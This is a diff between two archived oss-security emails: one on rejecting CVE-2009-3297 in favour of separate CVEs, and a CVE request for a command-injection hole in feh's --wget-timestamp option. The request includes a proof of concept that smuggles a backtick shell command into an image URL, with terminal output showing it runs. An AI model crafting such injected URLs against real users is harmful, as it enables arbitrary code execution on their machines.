@@ -1,61 +1,44 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/03/03/4
-Message-ID: <Pine.GSO.4.64.1003031249090.19475@faron.mitre.org>
-Date: Wed, 3 Mar 2010 13:01:18 -0500 (EST)
-From: "Steven M. Christey" <coley@...us.mitre.org>
-To: Vincent Danen <vdanen@...hat.com>
-cc: "Steven M. Christey" <coley@...us.mitre.org>, oss-security@...ts.openwall.com
-Subject: Re: CVE-2009-3297 samba/ncpfs/fuse issues granted individual 2010 CVE names?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/06/25/4
+Message-ID: <20100625171757.GA3646@derf.homelinux.org>
+Date: Fri, 25 Jun 2010 19:17:57 +0200
+From: Daniel Friesel <derf@...osdorf.de>
+To: oss-security@...ts.openwall.com
+Subject: CVE request: feh
 Content-Type: text/plain; charset=utf-8
 
+Hi,
 
-On Tue, 2 Mar 2010, Vincent Danen wrote:
+there is an arbitrary code execution hole in feh versions <= 1.7 down to at
+least 1.3.4 (I didn't check earlier ones).
+When the user uses feh to open a remote file (URL) and uses the
+--wget-timestamp option, feh passe the unescaped URL to a system() call.
 
-> * [2010-03-02 13:05:28 -0500] nobody@...hat.com via RT wrote:
->
-> Hi, Steve.  I'm confused about these three CVEs, particularly since
-> CVE-2009-3297 was assigned to this issue (I suppose it would be more
-> correct to have 3 CVEs for the issue, but I'm not sure then why
-> CVE-2009-3297 was completely ignored unless you intend for it to be not
-> used/duplicated to one of these?).
+So if an attacker can trick the user into opening an image URL containing
+shell metacharacters with feh --wget-timestamp, he is able to execute
+arbitrary shell code with the rights of the user executing feh. This requires
+the URL to resolve to an existing file, however. Obfuscating the shell code
+with HTTP escapes (like %20) does not seem to work, and a redirect (via
+tinyurl or similar) to a malicious URL will also have no effect.
 
-Sorry about not informing oss-security when I did this; I meant to.
+Example:
+remnant /t/feh > ls
+remnant /t/feh > feh --wget-timestamp 'https://derf.homelinux.org/stuff/bar`touch lol_hax`.jpg'
+/bin/cp: cannot stat `/tmp/feh_011422_bar.jpg': No such file or directory
+feh WARNING: /tmp/feh_011422_000001_bar`touch lol_hax`.jpg does not exist - skipping
+feh WARNING: /tmp/feh_011422_000001_bar`touch lol_hax`.jpg - File does not exist
+feh - No loadable images specified.
+Use feh --help for detailed usage information
+remnant /t/feh > ls
+lol_hax
+remnant /t/feh >
 
-CVE-2009-3297 has been rejected since it was used heavily for multiple 
-issues that should have been assigned separate entries.  People weren't 
-just using CVE-2009-3297 for Samba, they were using it for fuse and 
-others.
+This has been fixed in feh 1.8:
+<https://derf.homelinux.org/projects/feh/changelog>
 
-This rejection has since been uploaded to the CVE site:
+Please assign a CVE.
 
-http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3297
+Thanks,
+Daniel
 
-Along with the three new CVEs:
-
-CVE-2010-0787 (Samba)
-CVE-2010-0788 (ncpfs)
-CVE-2010-0789 (FUSE)
-
-I try very hard to avoid doing this kind of split (and REJECT) except when 
-it seems like there will be a lot of confusion; I know how much work it is 
-to clean these up in advisories and so on.  I recognize that many people 
-have used CVE-2009-3297 for the Samba problem, but it's been used in 
-DEBIAN:DSA-1989 for FUSE and FEDORA-2010-1145 for ncpfs, for example.  An 
-administrator who thinks that "CVE-2009-3297 is fixed" might have solved 
-the ncp issue but still be vulnerable to the Samba issue.
-
-I had originally asked oss-security for clarification on this, without an 
-answer:
-
-http://www.openwall.com/lists/oss-security/2010/02/04/7
-
-(recognizing that I'm the most guilty party for not answering...) but 
-other situations forced me to clear this out.
-
-> I'm also confused on using a 2010-based name since our bugzilla entry is
-> dated 2009-11-04, and Samba upstream has their reported dated
-> 2009-10-28, so these should have received 2009-based names.
-
-I agree - this was an error on my part, so I apologize for the confusion.
-
-- Steve
+Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
